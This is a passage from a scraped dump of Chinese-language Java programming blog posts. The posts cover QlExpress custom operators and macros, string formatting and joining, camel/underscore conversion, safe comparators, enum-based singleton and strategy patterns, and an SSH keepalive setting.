自定义Opeartor通常需要实现一个自定义的Operator时，可以考虑通过继承Opeartor类，实现executeInner方法 如实现一个字符串拆分操作符 split 12# 字符串，根据英文逗号进行分隔\"11,22,33\" split ',' 要实现上面这种脚本的支持，首先是定义一个自定义的Split 12345678910111213141516171819202122232425/** * 字符串转列表 */public static class Split extends Operator { @Override public Object executeInner(Object[] objects) { // 第一个参数为String，第二个参数为分割符号 String base = String.valueOf(objects[0]); String dot = \",\"; if (objects.length &gt; 1) { dot = String.valueOf(objects[1]); } String[] cells = StringUtils.split(base, dot); java.util.List&lt;String&gt; result = new java.util.ArrayList&lt;&gt;(); for (int i = 0; i &lt; cells.length; i++) { String cell = cells[i].trim(); if (cell.length() == 0) { continue; } result.add(cell); } return result; }} 接下来注册Operator 1234567ExpressRunner expressRunner = new ExpressRunner();DefaultContext&lt;String, Object&gt; context = new DefaultContext&lt;&gt;();expressRunner.addOperator(\"split\", new Split()); // 自定义Operator -&gt; split, 实现字符串拆分为列表Object ans = expressRunner.execute(\"\\\"1,2,3,4,5\\\" split ','\", context, null, true, false);System.out.println(ans); 执行之后输出结果如下 1[1, 2, 3, 4, 5] 从上面Operator的实现可以看到，第二个参数不传时，默认采用英文逗号进行分隔，那么表达式应该怎么写呢？ 123// 下面两种写法都会抛异常expressRunner.execute(\"split '1,2,3,'\", context, null, true, false);expressRunner.execute(\"'1,2,3,' split\", context, null, true, false) 目前从有限的使用姿势获取渠道上，使用Operator时，左右参数都需要有 当然如果只需要传入一个参数时，可以考虑下面的方式 注册Operator为方法 123// 将Operator定义为functionexpressRunner.addFunction(\"splitFunc\", new Split());System.out.println(expressRunner.execute(\"splitFunc(\\\"1,2,3,4,,5,\\\")\", context, null, true, false)); 上面有拆分，接下来添加一个配套的Joiner 12345678910111213141516/** * 列表转String */public static class Join extends Operator { @Override public Object executeInner(Object[] list) throws Exception { List target = (List) list[0]; String dot = \",\"; if (list.length &gt; 1) { dot = String.valueOf(list[1]); } return Stream.of(target).map(String::valueOf).collect(Collectors.joining(dot)); }} 测试case 12345678// 添加JoinexpressRunner.addOperator(\"join\", new Join());expressRunner.addFunction(\"joinFunc\", new Join());List list = Arrays.asList(\"hello\", 1, 2, 3, \"world\");context.put(\"list\", list);System.out.println(\"join:\" + expressRunner.execute(\"list join ','\", context, null, true, false));System.out.println(\"joinFunc:\" + expressRunner.execute(\"joinFunc(list, \\\";\\\")\", context, null, true, false)); 输出结果如 12join:[hello, 1, 2, 3, world]joinFunc:[hello, 1, 2, 3, world] 2. OperatorBase自定义Operator除了上面这种姿势之外，还可以通过继承OperatorBase来实现更富有想象力的玩法 比如实现一个编辑上下文信息的Operator 12345678910111213public class OperatorContextPut extends OperatorBase { public OperatorContextPut(String aName) { this.name = aName; } @Override public OperateData executeInner(InstructionSetContext parent, ArraySwap list) throws Exception { String key = list.get(0).toString(); Object value = list.get(1); parent.put(key, value); return null; }} 通过上面这个来实现编辑上下文内容（当然也是可以直接通过变量赋值，来修改上下文） 3. Mciro宏定义，学过c的小伙伴多半不会陌生这个东西，QlExpress可以通过addMacro来实现宏定义 如定义一个计数的宏 12345678910111213ExpressRunner runner = new ExpressRunner();DefaultContext&lt;String, Object&gt; context = new DefaultContext&lt;&gt;();// 宏，表示计数runner.addMacro(\"计数\", \"cnt = map.get(key); cnt = cnt == null ? 1: cnt + 1; map.put(key, cnt);\");Map&lt;String, Object&gt; map = new HashMap&lt;&gt;();map.put(\"kk\", 10);context.put(\"map\", map);runner.execute(\"String key = \\\"kk\\\"; 计数\", context, null, true, false);context.put(\"key\", \"cc\");runner.execute(\"计数\", context, null, true, false);System.out.println(\"计数之后:\" + map); 上面这个计数非常有意思，表达式就是一个 计数, 就可以实现map中key对应的value自增+1 如上面的输出结果如下 1计数之后:{kk=11, cc=1} 4. 小结本文主要介绍QlExpress中自定义Operator的使用姿势，以及Micro宏的简单示例 对于Opeartor，可以注册为Operator操作符，也可以注册为function；需要注意的是命名需要全局唯一 系列博文: 210628-QlExpress使用姿势三:Function与方法绑定 210624-QlExpress使用姿势二：基本语法 210623-QlExpress使用姿势一:预览 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/06/29/210629-QlExpress使用姿势四-Operator扩展/"},{"title":"210809-实战小技巧：字符串占位替换-JDK版","text":"字符串占位替换，相信没有小伙伴是陌生的，这东西可以说是伴随着我们所有的项目工程，编码过程；别不相信，如 String.format sql参数拼接的占位 log日志输出 接下来我们看一下在我们的日常工作生涯中，经常涉及到的几种占位替换方式 1. String.format这种可以说是最原始最基础的方式了，基本上在最开始学习java这门语言的时候就会涉及到，语法也比较简单 举例如下 1String.format(\"hello %s\", \"一灰灰blog”); 使用%来表示占位，后面跟上不同的标识符，用于限定这个占位处的参数类型 这种使用姿势，由jdk原生提供支持，下表为不同的转换符对应的说明 转换符 说明 参数实例 %s 字符串替换 “一灰灰” %c 字符类型 ‘a’ %b 布尔类型 true/false %d 整数，十进制 10 %x 整数，十六进制 0x12 %o 整数，八进制 012 %f 浮点 0.12f %e 指数 2e2 %g 通用浮点型 %h 散列 %% 百分比 %n 换行 %tx 日期与时间类型（x代表不同的日期与时间转换符 虽然上面表中列出了很多，但实际使用时，%s, %d, %f 这三个就足以应付绝大部分的场景了；使用姿势和上面的实例参不多，第一个参数为字符串模板，后面的可变参数为待替换的值 下面是在实际使用过程中的注意事项 1.1 类型不匹配上面的表中介绍了不同的转换符，要求的参数类型，如果没有对应上，会怎样 %s，传入非字符串类型 12345678@Testpublic void testFormat() { System.out.println(String.format(\"hello %s\", 120)); System.out.println(String.format(\"hello %s\", true)); System.out.println(String.format(\"hello %s\", new int[]{1,2, 3})); System.out.println(String.format(\"hello %s\", Arrays.asList(1, 2, 3))); System.out.println(String.format(\"hello %s\", 0x12));} 输出如下 12345hello 120hello truehello [I@3d82c5f3hello [1, 2, 3]hello 18 也就是说，%s的占位标记，传参如果不是String类型，那么实际替换的是 arg.toString() (所以数组输出的是地址，而list输出了内容) %d，传入非整数 与字符串的不一样的是，如果我们定义要求替换的参数类型为整数，那么传参不是整数，就会抛异常 12System.out.println(String.format(\"hello %d\", 1.0F));System.out.println(String.format(\"hello %d\", \"10\")); 上面这两个，一个传入的参数为浮点，一个传入的是字符串，在实际替换的时候，可不会调用Integer.valufOf(String.valueOf(xxx))来强转，而是采用更直接的方式，抛异常 关键的提示信息如下 12java.util.IllegalFormatConversionException: d != java.lang.Floatjava.util.IllegalFormatConversionException: d != java.lang.String 因此在实际使用这种方式进行替换时，推荐选择 %s，毕竟兼容性更好 1.2 参数个数不匹配我们会注意到,String.format接收的参数是不定长的，那么就可能存在字符串模板中预留的占位与实际传入的参数个数不匹配的场景，那么出现这种场景时，会怎样 参数缺少 1System.out.println(String.format(\"hello %s %s\", \"yihui\")); 上面的例子中，模板要求两个，实际只传入一个参数，会直接抛异常MissingFormatArgumentException 1java.util.MissingFormatArgumentException: Format specifier &apos;%s&apos; 参数过多 1System.out.println(String.format(\"hello %s\", \"yihuihui\", \"blog\")); 执行正常，多余的参数不会被替换 因此，我们在使用String.format进行字符串替换时，请确保传参不要少于实际定义的参数个数；多了还好，少了就会抛异常 2. MessageFormat上面介绍的String.format虽说简单好用，但我们用多之后，自然会遇到，一个参数，需要替换模板中多个占位的场景，针对这种场景，更友好的方式是MessageFormat，这个也是jdk原生提供的 我们来简单看一下它的使用姿势 1String ans = MessageFormat.format(\"hello {0}, wechart site {0}{1}\", \"一灰灰\", \"blog\"); 使用{数字}来表示占位，其中数字对应的是传参的下标，因此当一个参数需要复用时，使用MessageFormat就可以比较简单的实现了，上面就是一个实例，替换之后的字符串为 1hello 一灰灰, wechart site 一灰灰blog 接下来说一下它使用时的注意事项 2.1 {}成对出现如果字符串中，只出现一个{，而没有配套的}，会抛异常 12System.out.println(MessageFormat.format(\"hello }\", 123));System.out.println(MessageFormat.format(\"hello { world\", 456)); 注意上面两种case，上面一个是有}而缺少{，这样是没有问题的；而下面那个则会抛异常 1java.lang.IllegalArgumentException: Unmatched braces in the pattern. 如果字符串中却是希望输出{，可以使用单引号来处理 1System.out.println(MessageFormat.format(\"hello '{' world\", 456)); 2.2 单引号上面提到需要转移时，可以用单引号进行处理，在字符串模板的定义中，如果有单引号，需要各位注意 只有一个单引号，会导致后面所有占位都不生效 1System.out.println(MessageFormat.format(\"hello {0}, I'm {1}\", \"一灰灰\", \"blog\")); 上面这个输出结果可能和我们实际希望的不一致 1hello 一灰灰, Im {1} 要解决上面这个，就是使用两个单引号 1System.out.println(MessageFormat.format(\"hello {0}, I''m {1}\", \"一灰灰\", \"blog\")); 这样输出的就是我们预期的 1hello 一灰灰, I&apos;m blog 2.3 序号省略上面的定义中，已经明确要求我们在{}中指定参数的序号，如果模板中没有指定会怎样? 1System.out.println(messageFormat.format(\"hello {}, world\", \"yihuihui\")); 直接抛异常 1java.lang.IllegalArgumentException: can&apos;t parse argument number: 3. 小结本文介绍的实战小技巧属于是jdk原生提供的两种实现字符串占位替换的方式，除了这两个之外，我们日常开发中还会遇到其他的占位替换方式 比如sql的?替换，mybatis中sql参数组装使用${paramName}，或者logback日志输出中的{}来表示占位，spring的@Value注解声明的配置注入方式${name:defaultValue}，这些也都属于占位替换的范畴，那么它们又是怎么实现的呢？ 且看下文 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/08/09/210809-实战小技巧：字符串占位替换-JDK版/"},{"title":"210224-ssh防掉线设置","text":"通过ssh连接远程服务器，一段时间不操作之后自动断线，一个可选的设置方法，在服务端添加心跳设置 12345sudo vim /etc/ssh/sshd_config# 配置ClientAliveInterval 30ClientAliveCountMax 6 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/02/24/210224-ssh防掉线设置/"},{"title":"210814-实战小技巧5：驼峰与下划线互转","text":"每天一个实战小技巧：驼峰与下划线划转 这个考题非常实用，特别是对于我们这些号称只需要CURD的后端开发来说，驼峰与下划线互转，这不是属于日常任务么；一般来讲db中的列名，要求是下划线格式（why? 阿里的数据库规范是这么定义的，就我感觉驼峰也没毛病），而java实体命名则是驼峰格式，所以它们之间的互转，就必然存在一个驼峰与下划线的互转 今天我们就来看一下，这两个的互转支持方式 1. Gauva一般来讲遇到这种普适性的问题，大部分都是有现成的工具类可以来直接使用的；在java生态中，说到好用的工具百宝箱，guava可以说是排列靠前的 接下来我们看一下如何使用Gauva来实现我们的目的 1234567// 驼峰转下划线String ans = CaseFormat.LOWER_CAMEL.to(CaseFormat.LOWER_UNDERSCORE, \"helloWorld\");System.out.println(ans);// 下划线转驼峰String ans2 = CaseFormat.LOWER_UNDERSCORE.to(CaseFormat.LOWER_CAMEL, \"hello_world\");System.out.println(ans2); 在这里主要使用的是CaseFormat来实现互转，guava的CaseFormat还提供了其他几种方式 上面这个虽然可以实现互转，但是如果我们有一个字符串为 helloWorld_Case 将其他转换输出结果如下: 下划线：hello_world__case 驼峰：helloworldCase 这种输出，和标准的驼峰/下划线不太一样了（当然原因是由于输入也不标准） 2. Hutool除了上面的guava，hutool的使用也非常广，其中包含很多工具类，其StrUtil也提供了下划线与驼峰的互转支持 1234String ans = StrUtil.toCamelCase(\"hello_world\");System.out.println(ans);String ans2 = StrUtil.toUnderlineCase(\"helloWorld\");System.out.println(ans2); 同样的我们再来看一下特殊的case 12System.out.println(StrUtil.toCamelCase(\"helloWorld_Case\"));System.out.println(StrUtil.toUnderlineCase(\"helloWorld_Case\")); 输出结果如下 驼峰：helloworldCase 下划线: hello_world_case 相比较上面的guava的场景，下划线这个貌似还行 3. 自定义实现接下来为了满足我们希望转换为标砖的驼峰/下划线输出方式的需求，我们自己来手撸一个 下划线转驼峰: 关键点就是找到下划线，然后去掉它，下一个字符转大写续上（如果下一个还是下划线，那继续找下一个） 根据上面这个思路来实现，如下 12345678910111213141516171819202122232425262728293031private static final char UNDER_LINE = '_';/** * 下划线转驼峰 * * @param name * @return */public static String toCamelCase(String name) { if (null == name || name.length() == 0) { return null; } int length = name.length(); StringBuilder sb = new StringBuilder(length); boolean underLineNextChar = false; for (int i = 0; i &lt; length; ++i) { char c = name.charAt(i); if (c == UNDER_LINE) { underLineNextChar = true; } else if (underLineNextChar) { sb.append(Character.toUpperCase(c)); underLineNextChar = false; } else { sb.append(c); } } return sb.toString();} 驼峰转下划线 关键点：大写的，则前位补一个下划线，当前字符转小写（如果前面已经是一个下划线了，那前面不补，直接转小写即可） 12345678910111213141516171819202122public static String toUnderCase(String name) { if (name == null) { return null; } int len = name.length(); StringBuilder res = new StringBuilder(len + 2); char pre = 0; for (int i = 0; i &lt; len; i++) { char ch = name.charAt(i); if (Character.isUpperCase(ch)) { if (pre != UNDER_LINE) { res.append(UNDER_LINE); } res.append(Character.toLowerCase(ch)); } else { res.append(ch); } pre = ch; } return res.toString();} 再次测试helloWorld_Case，输出如下 驼峰：helloWorldCase 下划线: hello_world_case 系列博文 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧3：字符串与容器互转 实战小技巧4：优雅的实现字符串拼接 实战小技巧5：驼峰与下划线互转 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/08/14/210814-实战小技巧5：驼峰与下划线互转/"},{"title":"210812-实战小技巧4：优雅的实现字符串拼接","text":"每天一个实战小技巧，字符串拼接 相信没有小伙伴没有写过这样的代码，比如说现在让我们来实现一个字符串拼接的场景，怎样的实现才算是优雅的呢？ 以将int数组转为英文逗号分隔的字符串为例进行演示 1. 普通写法直接使用StringBuilder来拼接 1234567public String join(List&lt;Integer&gt; list) { StringBuilder builder = new StringBuilder(); for(Integer sub: list) { builder.append(sub).append(\",\"); } return builder.substring(0, builder.length() - 1);} 上面这种写法相信比较常见，相对来说不太顺眼的地方就是最后的toString，需要将最后的一个英文逗号给干掉 当然也可以用下面这种事前判断方式，避免最终的字符串截取 12345678910111213public String join2(List&lt;Integer&gt; list) { StringBuilder builder = new StringBuilder(); boolean first = true; for (Integer sub: list) { if (first) { first = false; } else { builder.append(\",\"); } builder.append(sub); } return builder.toString();} 2. StringJoiner上面实现中，干掉最后的一个分隔符实在不是很优雅，那么有更好一点的用法么，接下来看一下使用StringJoiner的方式 1234567public String join3(List&lt;Integer&gt; list) { StringJoiner joiner = new StringJoiner(\",\"); for (Integer s : list) { joiner.add(String.valueOf(s)); } return joiner.toString();} StringJoiner由jdk1.8提供，除了上面的基础玩法之外，结合jdk1.8带来的流操作方式，可以更简洁的实现 1return list.stream().map(String::valueOf).collect(Collectors.joining(\",\")); 怎么样，上面这个实现比起前面的代码是不是要简洁多了，一行代码完事 3. guava joiner如果使用的jdk还不是1.8版本，不能使用上面的StringJoiner，没关系，还有guava的Joiner也可以实现 123public String join5(List&lt;Integer&gt; list) { return Joiner.on(\",\").join(list);} 注意 接收的参数类型为: 数组/Iterable/Iterator/可变参数, 基本上可以覆盖我们日常的业务场景 4. 小结本篇文章的主题是一个非常非常常见的字符串拼接，一般来讲，我们在做字符串拼接时，最麻烦的事情就是分隔符的处理，要么就是分隔符前置添加，每次循环都需要判断是否为开头；要么就是后置，最后取字符串时，干掉最后一个分隔符 本文提供了一个非常使用的方式StringJoiner，完全解决了上面的分隔符问题，它的使用有两种场景 简单的容器转String：直接借助Stream的Collectors.joining来实现 for循环 （这种场景一般是for循环内的逻辑不仅仅包括字符串拼接，还包括其他的业务逻辑）： 循环内直接执行stringJoiner.add()添加 对于jdk1.8及以上的版本，优先推荐使用上面说的StringJoiner来实现字符串拼接；至于jdk1.8之下，那么Guava就是一个不错的选择了，使用姿势也很很简单 系列博文 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧3：字符串与容器互转 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/08/12/210812-实战小技巧4：优雅的实现字符串拼接/"},{"title":"210817-实战小技巧7：排序比较要慎重","text":"每天一个实战小技巧：排序比较要慎重 今天介绍的又是一个非常非常基本的基本知识点，为啥要单独拎出来？还是因为这个东西虽然非常简单，但是很容易掉坑，我已经遇到几次不严谨的写法了 1. Comparator 与 Comparable输掉排序，这两个接口好像不太容易绕过去，我们简单介绍下它们的区别 如果你有一个类，希望支持同类型的自定义比较策略，可以实现接口Compareable 如果某个类，没有实现Compareable接口，但是又希望对它进行比较，则可以自自定义一个Comparator，来定义这个类的比较规则 通过一个简单的实例进行演示说明 12345678910111213141516171819202122232425262728public static class Demo implements Comparable&lt;Demo&gt; { int code; int age; public Demo(int code, int age) { this.code = code; this.age = age; } @Override public int compareTo(Demo o) { if (code == o.code) { return 0; } else if (code &lt; o.code) { return -1; } else { return 1; } } @Override public String toString() { return \"Demo{\" + \"code=\" + code + \", age=\" + age + '}'; }} 上面的实现中，重点关注 Demo类，实现了Comparable接口，因此可以直接调用list.sort(null)来进行比较； 但是如果我们现在需求改变了，希望实现针对demo类的age字段，进行升序排列，那么就可以利用Comparator来实现了 123456789101112131415161718192021222324@Testpublic void testDemoSort() { List&lt;Demo&gt; list = new ArrayList&lt;&gt;(); list.add(new Demo(10, 30)); list.add(new Demo(12, 10)); list.add(new Demo(11, 20)); // 默认根据 code 进行升序比较 list.sort(null); System.out.println(\"sort by code: \" + list); list.sort(new Comparator&lt;Demo&gt;() { @Override public int compare(Demo o1, Demo o2) { if (o1.age == o2.age) { return 0; } else if (o1.age &lt; o2.age) { return -1; } else { return 1; } } }); System.out.println(\"sort by age: \" + list);} 输出结果如下 12sort by code: [Demo{code=10, age=30}, Demo{code=11, age=20}, Demo{code=12, age=10}]sort by age: [Demo{code=12, age=10}, Demo{code=11, age=20}, Demo{code=10, age=30}] 2. 踩坑预告再上面的compare方法实现中，我们可以发现里面的实现有点不太美观，我们最终的目的是什么？ 如果左边的小于右边的，返回 -1 如果左边的大于右边的，返回 0 如果左边的等于右边的，返回 1 基于此，经常可以看到的实现如下 123456list.sort(new Comparator&lt;Demo&gt;() { @Override public int compare(Demo o1, Demo o2) { return o1.age - o2.age; }}); 上面这个实现虽然简洁了，但是有一个致命的问题，可能溢出!!! 所以请注意，千万千万不要用上面这种写法 那么有没有更优雅的方式呢？ 有，使用基础类的compare方法 123456list.sort(new Comparator&lt;Demo&gt;() { @Override public int compare(Demo o1, Demo o2) { return Integer.compare(o1.age, o2.age); }}); 上面这一段代码，再jdk1.8中，可以简化为下面一句 1list.sort(Comparator.comparingInt(o -&gt; o.age)); 再扩展一下，如果希望倒排呢？ 第一种实现方式，调换位置 Jdk1.8方式，使用负数 12345678list.sort(new Comparator&lt;Demo&gt;() { @Override public int compare(Demo o1, Demo o2) { return Integer.compare(o2.age, o1.age); }});list.sort(Comparator.comparingInt(o -&gt; -o.age)); 3. 小结今天主要介绍的知识点是排序，再我们日常使用中，如果一个类希望支持排序，最好的方式就是让它实现Comparable接口，然后自定义排序方式 这样再容器中，如果需要排序，直接调用 list.sort(null) 或者 CollectionUtils.sort(list) 如果目标类没有实现排序接口，或者希望使用另外一种排序方式，则通过自定义的Comparator来实现 最后关于compare方法的实现，设计到两个类的比较，这种最终的落脚地，多半是基础类型的比较 o1 与 o2 比较，返回负数，则最终的结果中o1再前面（即升序排列） 不要直接使用 o1-o2会溢出，推荐使用 Integer.compare(o1, o2); 4. 实战系列推荐 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧 3：字符串与容器互转 实战小技巧4：优雅的实现字符串拼接 实战小技巧5：驼峰与下划线互转 实战小技巧6：枚举的特殊用法 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号: 一灰灰blog 3. 扫描关注一灰灰blog","link":"/hexblog/2021/08/17/210817-实战小技巧7：排序比较要慎重/"},{"title":"210811-实战小技巧3：字符串与容器互转","text":"每天一个实战小技巧：字符串与Collection的互转 将字符串转换为List，这种业务场景可以说非常非常常见了，实现方式也比较简单 1234public List&lt;String&gt; str2list(String str, String split) { String[] cells = str.split(split); return Arrays.asList(cells);} 那么除了上面这种实现方式之外，还有其他的么？ I. 字符串转列表上面的实现姿势相当于字符串先转数组，然后在通过数组转列表，所以可以沿用前一篇字数组转list的几种方式 1. jdk支持方式借助Collections.addAll来实现 12345public List&lt;String&gt; str2list2(String str, String split) { List&lt;String&gt; list = new ArrayList&lt;&gt;(); Collections.addAll(list, str.split(split)); return list;} 上面这种方式适用于输出String的列表，如果我希望转成int列表呢？可以采用下面的方式 123456public List&lt;Integer&gt; str2intList(String str, String split) { return Stream.of(str.split(split)) .map(String::trim) .filter(s -&gt; !s.isEmpty()) .map(Integer::valueOf).collect(Collectors.toList());} 直接将数组转换为流，然后基于jdk8的特性，来实现转换为int列表 2. guava方式引入依赖 123456&lt;!-- https://mvnrepository.com/artifact/com.google.guava/guava --&gt;&lt;dependency&gt; &lt;groupId&gt;com.google.guava&lt;/groupId&gt; &lt;artifactId&gt;guava&lt;/artifactId&gt; &lt;version&gt;30.1-jre&lt;/version&gt;&lt;/dependency&gt; 除了使用jdk原生的方式之外，借助guava也是非常常见的的case了，主要通过Splitter来实现，写法看起来非常秀 123public List&lt;String&gt; str2list2(String str, String split) { return Splitter.on(split).splitToList(str);} 简单直接的一行代码搞定，如果我们希望是对输出的列表类型进行指定，也可以如下操作 12345public List&lt;Integer&gt; str2intListV2(String str, String split) { return Splitter.on(split).splitToStream(str) .map(String::trim).filter(s -&gt; !s.isEmpty()) .map(Integer::valueOf).collect(Collectors.toList());} 3. apache-commons引入依赖 12345 &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.4&lt;/version&gt;&lt;/dependency&gt; 上面流的方式就很赞了，但是注意它是有jdk版本限制的，虽说现在基本上都是1.8以上的环境进行开发，但也不排除有上古的代码，比如我现在手上的项目，spring还是3… 如果我们不能使用流的方式，那么有什么简单的方式来实现字符串转换为指定类型的列表么？ 12345678910public List&lt;Integer&gt; str2intListV3(String str, String split) { List&lt;Integer&gt; result = new ArrayList&lt;&gt;(); CollectionUtils.collect(Arrays.asList(str.split(split)), new Transformer&lt;String, Integer&gt;() { @Override public Integer transform(String s) { return Integer.valueOf(s); } }, result); return result;} 上面这个实现也没有多优雅，不过这里有个编程小技巧可以学习，new Transformer(){}的传参方式，这种实现方式有点像回调的写法，虽然他们有本质的区别，此外就是jdk8之后的函数方法，就充分的体现这种设计思路，比如上面的换成jdk8的写法，直接简化为 12345public List&lt;Integer&gt; str2intListV3(String str, String split) { List&lt;Integer&gt; result = new ArrayList&lt;&gt;(); CollectionUtils.collect(Arrays.asList(str.split(split)), Integer::valueOf, result); return result;} II. 列表转字符串1. StringBuilder最容易想到的，直接使用StringBuilder来实现拼接 1234567public String list2str(List&lt;String&gt; list, String split) { StringBuilder builder = new StringBuilder(); for (String str: list) { builder.append(str).append(split); } return builder.substring(0, builder.length() - 1);} 注意两点： 使用StringBuilder而不是StringBuffer (why?) 注意最后一个拼接符号不要 2. String.join一个更简单的实现方式如下 123public String list2str2(List&lt;String&gt; list, String split) { return String.join(split, list);} 当然上面这个的缺点就是列表必须是字符串列表，如果换成int列表，则不行 3. gauvaguava也提供了列表转String的方式，同样很简单，而且还没有列表类型的限制 123public &lt;T&gt; String list2str3(List&lt;T&gt; list, String split) { return Joiner.on(split).join(list);} III. 小结本文的考题也非常常见，列表与字符串的互转，这里介绍了多种实现方式，有jdk原生的case（如果没有什么限制，推荐使用它， String.split除外，原因后面再说），如果有更高级的定制场景，如非String类型类表，则可以考虑guava的Splitter/Joinner来实现 在上面的实现中，也提供了几种有意思的编程方式 Stream: 流，jdk8之后非常常见了 函数方法，回调写法case 系列博文 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/08/11/210811-实战小技巧3：字符串与容器互转/"},{"title":"210816-实战小技巧6：枚举的特殊用法","text":"每天一个实战小技巧：枚举的特殊用法 难道我们日常使用的枚举还有什么特殊的玩法不成？没错，还真有，本文主要介绍枚举的两种不那么常见的使用姿势 利用枚举来实现单例模式 利用枚举来实现策略模式 1. 单例模式单例模式可以说是每个java开发者必须掌握的一个设计模式了，通常我们说它的实现，有饱汉式和饿汉式，也有经常说的双重判断，今天我们介绍另外一种方式，借助枚举来实现 123456789101112public enum SingleEnum { INSTANCE; public void print(String word) { System.out.println(word); }}@Testpublic void testSingle() { SingleEnum.INSTANCE.print(\"hello world\");} 使用枚举来实现单例模式非常非常简单，将类声明为枚举，内部只定义一个值即可 为什么可以这样做？ 枚举类不能new，因此保证单例 枚举类不能被继承 类不加载时，不会实例化 使用枚举类创建的单例有一个好处，就是即使用反射，也无法打破它的单例性质，这是相比较于其他的实现方式的一个优点 那么，为啥在实际的项目中，不太常见这种写法？ 就我个人的一点认知（不保证准确）：这个与我们对枚举的认知有一定关系，在 《Effect in java》一书中，推荐我们使用这种方式来实现单例，但是在实际的项目开发中，我们更多的将枚举作为常量来使用，很少在枚举类中，添加复杂的业务逻辑 2. 策略模式枚举除了很容易就实现上面的单例模式之外，还可以非常简单的实现策略模式 举一个简单的例子，我现在有一个接口，通过接受的参数，来决定最终的数据存在什么地方 如果按照正常的写法，可能就是很多的if/else 123456789101112public void save(String type, Object data) { if (\"db\".equals(type) { // 保存到db saveInDb(data); } else if (\"file\".equals(type)) // 保存在文件 saveInFile(data); } else if (\"oss\".eqauls(type)) { // 保存在oss saveInOss(type); }} 上面这种写法虽说简单直观，但是当type类型一多了之后，这个if/else的代码行数就会很多很多了，而且看起来也不美观 接下来我们介绍一种利用枚举，基于策略模式的思想来解决上面的if/else问题 1234567891011121314151617181920212223242526272829303132333435363738394041424344public enum SaveStrategyEnum { DB(\"db\") { @Override public void save(Object obj) { System.out.println(\"save in db:\" + obj); } }, FILE(\"file\") { @Override public void save(Object obj) { System.out.println(\"save in file: \" + obj); } }, OSS(\"oss\") { @Override public void save(Object obj) { System.out.println(\"save in oss: \" + obj); } }; private String type; SaveStrategyEnum(String type) { this.type = type; } public abstract void save(Object obj); public static SaveStrategyEnum typeOf(String type) { for (SaveStrategyEnum strategyEnum: values()) { if (strategyEnum.type.equalsIgnoreCase(type)) { return strategyEnum; } } return null; }}public void save(String type, Object data) { SaveStrategyEnum strategyEnum = SaveStrategyEnum.typeOf(type); if (strategyEnum != null) { strategyEnum.save(data); }} 上面的实现，主要利用的是抽象类 + 枚举来完成不同的策略具体实现 这种实现方式，相比较与前面的单例模式，还是更常见一点，虽然整体看下来没有什么难度，但是仔细看一看，会发现几个知识点 抽象方法的使用 （在模板设计模式中，更能体会抽象方法的使用妙处） 利用枚举原生提供的values()，来实现遍历，找到目标 3. 小结枚举虽然说是jdk原生提供的一个基础数据类型，但是它的使用姿势除了我们熟知的常量之外，还可以有效的运用在设计模式中，让我们的代码实现更优雅 比如使用枚举来实现单例模式，就不用再面对让人烦躁的双重判断/内部类的方式了 使用枚举的策略模式，也可以有效解决我们类中大量的if/else 4. 实战系列推荐 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧 3：字符串与容器互转 实战小技巧4：优雅的实现字符串拼接 实战小技巧5：驼峰与下划线互转 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 微信公众号: 